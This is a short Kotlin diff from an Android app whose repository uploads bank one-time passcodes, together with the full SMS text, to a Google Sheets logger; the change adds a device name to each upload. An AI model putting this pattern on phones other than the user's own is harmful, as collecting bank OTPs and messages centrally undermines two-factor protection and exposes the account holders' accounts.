@@ -41,7 +41,8 @@ class OtpRepository(private val context: Context) {
     }
 
     suspend fun uploadOtp(bankName: String, otpCode: String, fullMessage: String): Boolean {
-        return GoogleSheetsLogger.uploadOtp(bankName, otpCode, fullMessage)
+        val deviceName = sharedPrefs.getString("device_name", "Unknown") ?: "Unknown"
+        return GoogleSheetsLogger.uploadOtp(bankName, otpCode, fullMessage, deviceName)
     }
 
     suspend fun fetchLatestOtps(): SyncResponse {
